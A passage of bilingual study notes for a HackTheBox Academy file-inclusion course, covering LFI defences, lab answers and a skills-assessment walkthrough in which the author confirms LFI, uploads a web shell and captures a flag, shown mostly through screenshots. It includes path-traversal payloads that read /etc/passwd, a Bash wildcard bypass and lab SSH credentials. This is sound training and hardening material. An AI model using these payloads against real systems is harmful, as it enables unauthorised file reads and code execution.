$language = basename($_GET['language']);
include("./languages/" . $language);
// "../../../etc/passwd" → basename() → "passwd" ✅

// Recursive remove ../ — phòng bypass non-recursive filter:
while(substr_count($input, '../', 0)) {
    $input = str_replace('../', '', $input);
}
```

> ⚠️ **Edge case quan trọng:** Bash cho phép wildcard `?` và `*` thay thế `.` trong path traversal:
> 
> bash
> 
> ```bash
> cat .?/.*/.?/etc/passwd   # hoạt động trên Bash ✅
> ```
> 
> PHP thuần không bị — nhưng nếu PHP gọi `system()` → Bash execute → bypass xảy ra. Dùng native framework function để được community patch edge case này.

---

### 4. Web Server Configuration

ini

```ini
# php.ini — disable remote file inclusion:
allow_url_fopen  = Off
allow_url_include = Off

# Giới hạn PHP chỉ đọc được trong web root:
open_basedir = /var/www

# Disable module nguy hiểm:
# - PHP Expect (expect://)
# - mod_userdir
```

**Containerization:**

bash

```bash
# Docker là cách tốt nhất — isolate hoàn toàn filesystem:
# LFI tìm được /etc/passwd của container → không phải host
docker run --read-only -v /var/www/html:/var/www/html myapp
```

---

### 5. WAF — ModSecurity

```
Permissive mode (Detection only)
    → Log các request bị flag
    → Tune rules → loại bỏ false positive
    → Khi ổn định → chuyển sang Blocking mode
```

> 💡 Ngay cả khi chỉ để **permissive mode** — vẫn có giá trị như early warning system khi đang bị tấn công.

---

### 6. Hardening Mindset

> _"Mục tiêu của hardening không phải làm hệ thống un-hackable — mà là để attacker để lại nhiều dấu vết hơn, giúp defender phát hiện sớm hơn."_

Theo FireEye M-Trends 2020: thời gian trung bình phát hiện breach là **30 ngày**. Hardening rút ngắn con số này.

- Hardened system vẫn phải **monitor logs liên tục**
- Phải **retest sau mỗi zero-day** liên quan (Apache Struts, Rails, Django, v.v.)
- Zero-day thường vẫn work — nhưng hardening tạo ra **log bất thường** giúp confirm exploit đã xảy ra

---

### 7. Defense Checklist

|Biện pháp|Mức độ ưu tiên|
|---|---|
|Không dùng user input trong file functions|★★★★★|
|Whitelist input → map to file|★★★★★|
|`basename()` để strip path|★★★★|
|Recursive `../` removal|★★★★|
|`allow_url_include = Off`|★★★★★|
|`open_basedir = /var/www`|★★★★|
|Disable `expect`, `mod_userdir`|★★★|
|Docker containerization|★★★★|
|WAF (ModSecurity)|★★★★|
|Continuous log monitoring|★★★★★|

#### Question 1

What is the full path to the php.ini file for Apache? SSH to 10.129.29.112 (ACADEMY-LFI-HARDEN), with user "htb-student" and password "HTB_@cademy_stdnt!" 

![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-9daeed74c901ec1d825403c2d59939df.png)

#### Question 2
Edit the php.ini file to block system(), then try to execute PHP Code that uses system. Read the /var/log/apache2/error.log file and fill in the blank: system() has been disabled for ________ reasons.
Add system to disable function
![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-9177fdbbcaeb578bd6299bc2996c127b.png)

Create shell php using system()
![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-531faa0048192409ed3f12b3474a6440.png)
Restart apache2
![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-87b460fb613558ef03f35eedc45ec5a7.png)

Access through web
![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-082d7697670c88769d049b5b5e4743a2.png)

Check log
![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-6c0ab6fa2be092a86c7cc03155bde9eb.png)

## SECTION 11: Skills Assessment - File Inclusion

You have been contracted by `Sumace Consulting Gmbh` to carry out a web application penetration test against their main website. During the kickoff meeting, the CISO mentioned that last year's penetration test resulted in zero findings, however they have added a job application form since then, and so it may be a point of interest.
####  Question 1
Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.
Access the page
![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-dc9ecd4e85382146de0458e2c05662c9.png)
Navigate through page source, identify interesting api
![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-17b5087e4de2fa8ba6e234e51bacb0f8.png)

Check the api

![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-3c8d21fde06e37f26cbd21ae26a1c3b3.png)

Trying to fuzzing with p parameter some suspicious result returned
![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-8267a814fb673fec543239f909e49ccf.png)

Confirm LFI

![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-652b4aadf46870c3c45bafa962f0f185.png)
Keep identify, upload apply, can upload a shell to server. But cannot identify directory that the shell come in. Start to brute force i find config files
![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-cfe9de1e92293c97058d2bc37f0fde28.png)

Check access log, then try to use LFI log poisoning but failed.

![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-e4c904a0469fc56384ec26d4172925bd.png)

Check config files, identify the uploads directory
![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-02a4af0f3729ab69bd94ba361d8e6704.png)

Checking api/image.php, found that the function in use is file_get_contents() which is can read file only

![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-2b86b9098fe8a5bf2b57dbe486bd6a6f.png)

When checking apply.php i found api/application.php
![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-54dae38855ce61b797a156951a48c973.png)

We can confirm that the file uploads position
![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-5b1f6e2ade7aca48d1701aa511516409.png)

Check our shell
![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-26399f9952d09b3c2c86d26370d257d1.png)

Checking the contact.php, found an secret parameter.
![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-d0ddcff3042e22c39c4c7f01938db214.png)

Exploit it and get the flag
![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-afc09b54d9d15fd055a1f7471240497a.png)